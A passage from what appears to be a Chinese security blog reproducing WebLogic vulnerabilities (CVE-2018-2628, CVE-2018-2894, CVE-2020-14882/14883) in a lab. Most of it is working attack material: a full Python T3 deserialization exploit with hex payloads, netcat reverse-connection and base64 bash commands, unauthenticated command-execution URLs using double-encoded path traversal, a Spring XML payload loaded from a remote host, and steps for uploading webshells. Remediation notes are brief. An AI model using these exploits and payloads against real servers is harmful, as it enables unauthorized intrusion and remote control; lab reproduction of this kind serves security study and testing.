class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">array</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">void</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;start&quot;</span>/&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">void</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">java</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">work:WorkContext</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Header</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">soapenv:Body</span>/&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;/<span class="hljs-name">soapenv:Envelope</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><img src="/../../../blog_image/image-20240502223944645-1717164228330-21.png" alt="image-20240502223944645"></p><p>成功反弹shell：</p><p><img src="/../../../blog_image/image-20240502223732695-1717164228330-22.png" alt="image-20240502223732695"></p><p>这里虽说写不了webshell，但是可以命令执行啊！虽然但是，我们可以通过linux的echo操作去写文件，但是还是需要绝对路径才可以的（不过有了shell还要啥webshell？）</p><p><a href="https://www.cnblogs.com/chen-w/p/14648806.html">记weblogic上传shell路径 - Chen-w - 博客园 (cnblogs.com)</a></p><h1 id="4-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）"><a href="#4-WLS-Core-Components-反序列化命令执行漏洞（CVE-2018-2628）" class="headerlink" title="4. WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）"></a>4. WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）</h1><h2 id="4-1-漏洞简述："><a href="#4-1-漏洞简述：" class="headerlink" title="4.1 漏洞简述："></a>4.1 漏洞简述：</h2><p>Oracle 2018年4月补丁中，修复了Weblogic Server WLS Core Components中出现的一个反序列化漏洞（CVE-2018-2628），该漏洞通过t3协议触发，可导致未授权的用户在远程服务器执行任意命令。</p><h2 id="4-2-漏洞原理："><a href="#4-2-漏洞原理：" class="headerlink" title="4.2 漏洞原理："></a>4.2 漏洞原理：</h2><p>通过xml反序列化执行t3协议触发漏洞，从而执行任意命令。</p><h2 id="4-3-漏洞复现："><a href="#4-3-漏洞复现：" class="headerlink" title="4.3 漏洞复现："></a>4.3 漏洞复现：</h2><p>ysoserial启动JRMP服务端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> ysoserial.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [<span class="hljs-built_in">command</span>]<br></code></pre></td></tr></table></figure><p>其中，<code>[command]</code>即为我想执行的命令，而<code>[listen port]</code>是JRMP Server监听的端口。</p><p>python执行exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-comment"># Oracle Weblogic Server (10.3.6.0, 12.1.3.0, 12.2.1.2, 12.2.1.3) Deserialization Remote Command Execution Vulnerability (CVE-2018-2628)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># IMPORTANT: Is provided only for educational or information purposes.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Credit: Thanks by Liao Xinxi of NSFOCUS Security Team</span><br><span class="hljs-comment"># Reference: http://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># How to exploit:</span><br><span class="hljs-comment"># 1. run below command on JRMPListener host</span><br><span class="hljs-comment">#    1) wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</span><br><span class="hljs-comment">#    2) java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command]</span><br><span class="hljs-comment">#       e.g. java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 &#x27;nc -nv 10.0.0.5 4040&#x27;</span><br><span class="hljs-comment"># 2. start a listener on attacker host</span><br><span class="hljs-comment">#    e.g. nc -nlvp 4040</span><br><span class="hljs-comment"># 3. run this script on attacker host</span><br><span class="hljs-comment">#    1) wget https://github.com/brianwrf/ysoserial/releases/download/0.0.6-pri-beta/ysoserial-0.0.6-SNAPSHOT-BETA-all.jar</span><br><span class="hljs-comment">#    2) python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]</span><br><span class="hljs-comment">#       e.g.</span><br><span class="hljs-comment">#           a) python exploit.py 10.0.0.11 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 10.0.0.5 1099 JRMPClient (Using java.rmi.registry.Registry)</span><br><span class="hljs-comment">#           b) python exploit.py 10.0.0.11 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 10.0.0.5 1099 JRMPClient2 (Using java.rmi.activation.Activator)</span><br><br><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_payload</span>(<span class="hljs-params">path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client</span>):<br>    <span class="hljs-comment">#generates ysoserial payload</span><br>    command = <span class="hljs-string">&#x27;java -jar &#123;&#125; &#123;&#125; &#123;&#125;:&#123;&#125; &gt; payload.out&#x27;</span>.<span class="hljs-built_in">format</span>(path_ysoserial, jrmp_client, jrmp_listener_ip, jrmp_listener_port)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;command: &quot;</span> + command)<br>    os.system(command)<br>    bin_file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;payload.out&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>    <span class="hljs-keyword">return</span> binascii.hexlify(bin_file)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">t3_handshake</span>(<span class="hljs-params">sock, server_addr</span>):<br>    sock.connect(server_addr)<br>    sock.send(<span class="hljs-string">&#x27;74332031322e322e310a41533a3235350a484c3a31390a4d533a31303030303030300a0a&#x27;</span>.decode(<span class="hljs-string">&#x27;hex&#x27;</span>))<br>    time.sleep(<span class="hljs-number">1</span>)<br>    sock.recv(<span class="hljs-number">1024</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;handshake successful&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_t3_request_object</span>(<span class="hljs-params">sock, port</span>):<br>    data1 = <span class="hljs-string">&#x27;000005c3016501ffffffffffffffff0000006a0000ea600000001900937b484a56fa4a777666f581daa4f5b90e2aebfc607499b4027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c657400124c6a6176612f6c616e672f537472696e673b4c000a696d706c56656e646f7271007e00034c000b696d706c56657273696f6e71007e000378707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b4c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00044c000a696d706c56656e646f7271007e00044c000b696d706c56657273696f6e71007e000478707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200217765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e50656572496e666f585474f39bc908f10200064900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463685b00087061636b616765737400275b4c7765626c6f6769632f636f6d6d6f6e2f696e7465726e616c2f5061636b616765496e666f3b787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e56657273696f6e496e666f972245516452463e0200035b00087061636b6167657371&#x27;</span><br>    data2 = <span class="hljs-string">&#x27;007e00034c000e72656c6561736556657273696f6e7400124c6a6176612f6c616e672f537472696e673b5b001276657273696f6e496e666f417342797465737400025b42787200247765626c6f6769632e636f6d6d6f6e2e696e7465726e616c2e5061636b616765496e666fe6f723e7b8ae1ec90200084900056d616a6f724900056d696e6f7249000c726f6c6c696e67506174636849000b736572766963655061636b5a000e74656d706f7261727950617463684c0009696d706c5469746c6571007e00054c000a696d706c56656e646f7271007e00054c000b696d706c56657273696f6e71007e000578707702000078fe00fffe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c000078707750210000000000000000000d3139322e3136382e312e323237001257494e2d4147444d565155423154362e656883348cd6000000070000&#123;0&#125;ffffffffffffffffffffffffffffffffffffffffffffffff78fe010000aced0005737200137765626c6f6769632e726a766d2e4a564d4944dc49c23ede121e2a0c0000787077200114dc42bd07&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;&#123;:04x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(dport))<br>    data3 = <span class="hljs-string">&#x27;1a7727000d3234322e323134&#x27;</span><br>    data4 = <span class="hljs-string">&#x27;2e312e32353461863d1d0000000078&#x27;</span><br>    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> [data1,data2,data3,data4]:<br>        sock.send(d.decode(<span class="hljs-string">&#x27;hex&#x27;</span>))<br>    time.sleep(<span class="hljs-number">2</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;send request payload successful,recv length:%d&#x27;</span>%(<span class="hljs-built_in">len</span>(sock.recv(<span class="hljs-number">2048</span>))))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">send_payload_objdata</span>(<span class="hljs-params">sock, data</span>):<br>    payload=<span class="hljs-string">&#x27;056508000000010000001b0000005d010100737201787073720278700000000000000000757203787000000000787400087765626c6f67696375720478700000000c9c979a9a8c9a9bcfcf9b939a7400087765626c6f67696306fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200025b42acf317f8060854e002000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078707702000078fe010000aced00057372001d7765626c6f6769632e726a766d2e436c6173735461626c65456e7472792f52658157f4f9ed0c000078707200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78707702000078fe010000&#x27;</span><br>    payload+=data<br>    payload+=<span class="hljs-string">&#x27;fe010000aced0005737200257765626c6f6769632e726a766d2e496d6d757461626c6553657276696365436f6e74657874ddcba8706386f0ba0c0000787200297765626c6f6769632e726d692e70726f76696465722e426173696353657276696365436f6e74657874e4632236c5d4a71e0c0000787077020600737200267765626c6f6769632e726d692e696e7465726e616c2e4d6574686f6444657363726970746f7212485a828af7f67b0c000078707734002e61757468656e746963617465284c7765626c6f6769632e73656375726974792e61636c2e55736572496e666f3b290000001b7878fe00ff&#x27;</span><br>    payload = <span class="hljs-string">&#x27;%s%s&#x27;</span>%(<span class="hljs-string">&#x27;&#123;:08x&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(payload)/<span class="hljs-number">2</span> + <span class="hljs-number">4</span>),payload)<br>    sock.send(payload.decode(<span class="hljs-string">&#x27;hex&#x27;</span>))<br>    time.sleep(<span class="hljs-number">2</span>)<br>    sock.send(payload.decode(<span class="hljs-string">&#x27;hex&#x27;</span>))<br>    res = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            res += sock.recv(<span class="hljs-number">4096</span>)<br>            time.sleep(<span class="hljs-number">0.1</span>)<br>    <span class="hljs-keyword">except</span> Exception:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">return</span> res<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>(<span class="hljs-params">dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client</span>):<br>    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>    sock.settimeout(<span class="hljs-number">65</span>)<br>    server_addr = (dip, dport)<br>    t3_handshake(sock, server_addr)<br>    build_t3_request_object(sock, dport)<br>    payload = generate_payload(path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;payload: &quot;</span> + payload)<br>    rs=send_payload_objdata(sock, payload)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;response: &#x27;</span> + rs)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;exploit completed!&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-comment">#check for args, print usage if incorrect</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) != <span class="hljs-number">7</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;\nUsage:\nexploit.py [victim ip] [victim port] [path to ysoserial] &#x27;</span><br>              <span class="hljs-string">&#x27;[JRMPListener ip] [JRMPListener port] [JRMPClient]\n&#x27;</span>)<br>        sys.exit()<br><br>    dip = sys.argv[<span class="hljs-number">1</span>]<br>    dport = <span class="hljs-built_in">int</span>(sys.argv[<span class="hljs-number">2</span>])<br>    path_ysoserial = sys.argv[<span class="hljs-number">3</span>]<br>    jrmp_listener_ip = sys.argv[<span class="hljs-number">4</span>]<br>    jrmp_listener_port = sys.argv[<span class="hljs-number">5</span>]<br>    jrmp_client = sys.argv[<span class="hljs-number">6</span>]<br>    exploit(dip, dport, path_ysoserial, jrmp_listener_ip, jrmp_listener_port, jrmp_client)<br>            <br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python2 exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient]<br></code></pre></td></tr></table></figure><p>其中，<code>[victim ip]</code>和<code>[victim port]</code>是目标weblogic的IP和端口，<code>[path to ysoserial]</code>是本地ysoserial的路径，<code>[JRMPListener ip]</code>和<code>[JRMPListener port]</code>第一步中启动JRMP Server的IP地址和端口。<code>[JRMPClient]</code>是执行JRMPClient的类，可选的值是<code>JRMPClient</code>或<code>JRMPClient2</code>。</p><p>启动JRMP服务端：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java -<span class="hljs-built_in">cp</span> ysoserial.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections1 <span class="hljs-string">&quot;touch /tmp/success&quot;</span><br></code></pre></td></tr></table></figure><p>java -cp ysoserial.jar ysoserial.exploit.JRMPListener 7001 Jdk7u21 ‘bash -c {echo,dG91Y2ggL3RtcC9zdWNjZXNz}|{base64,-d}|{bash,-i}’</p><h2 id="4-4-修复建议："><a href="#4-4-修复建议：" class="headerlink" title="4.4 修复建议："></a>4.4 修复建议：</h2><p>过滤T3协议，连接筛选器选择：</p><p>weblogic.security.net.ConnectionFilterImpl</p><p>选择保存即可。</p><h1 id="5-任意文件上传漏洞（CVE-2018-2894）："><a href="#5-任意文件上传漏洞（CVE-2018-2894）：" class="headerlink" title="5. 任意文件上传漏洞（CVE-2018-2894）："></a>5. 任意文件上传漏洞（CVE-2018-2894）：</h1><h2 id="5-1-漏洞简述："><a href="#5-1-漏洞简述：" class="headerlink" title="5.1 漏洞简述："></a>5.1 漏洞简述：</h2><p>Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page在“生产模式”下默认不开启，所以该漏洞存在限制。</p><p>影响范围：</p><p>10.3.6、12.1.3、12.2.1.2、12.2.1.3</p><h2 id="5-2-漏洞原理："><a href="#5-2-漏洞原理：" class="headerlink" title="5.2 漏洞原理："></a>5.2 漏洞原理：</h2><p>配置不当导致，在生产环境默认不开启，从而存在任意文件上传。</p><p>12版本，前面以及现在的默认安装是“开发模式”，“生产模式”下没有这两处上传点。</p><h2 id="5-3-漏洞复现："><a href="#5-3-漏洞复现：" class="headerlink" title="5.3 漏洞复现："></a>5.3 漏洞复现：</h2><p>查看密码：</p><p><img src="/../../../blog_image/image-20240507152047462.png" alt="image-20240507152047462"></p><p>账号weblogic，密码是g1hNLfiJ</p><p><img src="/../../../blog_image/image-20240507153207405.png" alt="image-20240507153207405"></p><p>勾选上web测试</p><p><img src="/../../../blog_image/image-20240507153238070.png" alt="image-20240507153238070"></p><p>访问<code>http://yourip:7001/ws_utc/config.do</code>：</p><p><img src="/../../../blog_image/image-20240507150159591.png" alt="image-20240507150159591"></p><p>修改工作目录为css的目录，因为这个目录是不需要权限的，然后点击<code>提交</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/u01/</span>oracle<span class="hljs-regexp">/user_projects/</span>domains<span class="hljs-regexp">/base_domain/</span>servers<span class="hljs-regexp">/AdminServer/</span>tmp<span class="hljs-regexp">/_WL_internal/</span>com.oracle.webservices.wls.ws-testclient-app-wls<span class="hljs-regexp">/4mcj4y/</span>war/css<br></code></pre></td></tr></table></figure><p>点击安全上传文件：</p><p><img src="/../../../blog_image/image-20240507150627169.png" alt="image-20240507150627169"></p><p>抓包后上传会返回一个时间戳：</p><p><img src="/../../../blog_image/image-20240507150723474.png" alt="image-20240507150723474"></p><p>访问<code>http://yourip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]</code></p><p>其实前端也有显示时间戳：</p><p><img src="/../../../blog_image/image-20240507153537434.png" alt="image-20240507153537434"></p><p>上传冰蝎子3.0的马子，冰蝎3连接成功：</p><p><img src="/../../../blog_image/image-20240507153512198.png" alt="image-20240507153512198"></p><p>实测冰蝎4.0也连接成功：</p><p><img src="/../../../blog_image/image-20240507153730605.png" alt="image-20240507153730605"></p><p>实测上传冰蝎4.0的马子是不行的。</p><p>jmg生成的内存马，实测3.0和4.0都可以：</p><p><img src="/../../../blog_image/image-20240507154323983.png" alt="image-20240507154323983"></p><h2 id="5-4-修复建议："><a href="#5-4-修复建议：" class="headerlink" title="5.4 修复建议："></a>5.4 修复建议：</h2><p>1.启动生产模式后Config.do页面登录授权后访问。</p><p>2.升级到最新版本。</p><p>3.IPS等防御产品加入相应的特征。</p><h1 id="6-Weblogic-管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）："><a href="#6-Weblogic-管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）：" class="headerlink" title="6. Weblogic 管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）："></a>6. Weblogic 管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）：</h1><h2 id="6-1-漏洞简述："><a href="#6-1-漏洞简述：" class="headerlink" title="6.1 漏洞简述："></a>6.1 漏洞简述：</h2><p>CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令</p><h2 id="6-2-漏洞原理："><a href="#6-2-漏洞原理：" class="headerlink" title="6.2 漏洞原理："></a>6.2 漏洞原理：</h2><p>使用CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台后再使用CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令，从而实现未授权访问任意身份执行命令。</p><h2 id="6-3-漏洞复现："><a href="#6-3-漏洞复现：" class="headerlink" title="6.3 漏洞复现："></a>6.3 漏洞复现：</h2><p>访问如下连接，即可无授权登录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">http://yourip:7001/console/css/%252e%252e%252fconsole.portal<br></code></pre></td></tr></table></figure><p>这个url其实是两次url编码的结果，url解密后:</p><p><img src="/../../../blog_image/image-20240507155455689.png" alt="image-20240507155455689"></p><p>发现是目录穿越导致。</p><p>查看主页面尝试上传webshell，是低权限用户，没有上传的功能。</p><p><img src="/../../../blog_image/image-20240507155618452.png" alt="image-20240507155618452"></p><p>此时需要利用到第二个漏洞CVE-2020-14883。这个漏洞的利用方式有两种，一是通过<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>，二是通过<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>。</p><p>直接访问如下URL，即可利用<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>执行命令：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span>your-ip:<span class="hljs-number">7001</span>/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;touch%20/tmp/success1&#x27;);&quot;</span>)<br></code></pre></td></tr></table></figure><p>如：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">42.128</span>:<span class="hljs-number">7001</span>/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(<span class="hljs-string">&quot;java.lang.Runtime.getRuntime().exec(&#x27;touch%20/tmp/success1&#x27;);&quot;</span>)<br></code></pre></td></tr></table></figure><p><img src="/../../../blog_image/image-20240507155901137.png" alt="image-20240507155901137"></p><p>成功写入，表明可以任意命令执行。</p><p>这个利用方法（com.tangosol.coherence.mvel2.sh.ShellSession）只能在Weblogic 12.2.1以上版本利用，因为10.3.6并不存在<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>类。</p><p>处理上面这两种还有使用<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>，这是一种更为通杀的方法，最早在CVE-2019-2725被提出，对于所有Weblogic版本均有效。</p><p>如果目标出网，可以使用远程下载xml写的payload，并且执行。</p><p>访问如下路径，即可远程下载xml，并且实现xml反序列化执行。</p><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xquery">http://your-ip:<span class="hljs-number">7001</span>/console/css/<span class="hljs-meta">%252e</span><span class="hljs-meta">%252e</span><span class="hljs-meta">%252fconsole</span>.portal?_nfpb<span class="hljs-built_in">=true</span>&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.<span class="hljs-keyword">context</span>.support.FileSystemXmlApplicationContext(<span class="hljs-string">&quot;http://example.com/rce.xml&quot;</span>)<br></code></pre></td></tr></table></figure><p>命令执行：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">   <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span>&gt;</span><br>          <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&lt;![CDATA[touch /tmp/success2]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br>          <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span><br></code></pre></td></tr></table></figure><p>运行：</p><p><img src="/../../../blog_image/image-20240507160823496.png" alt="image-20240507160823496"></p><p>成功写入：</p><p><img src="/../../../blog_image/image-20240507160922158.png" alt="image-20240507160922158"></p><p>可以写成反弹shell：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 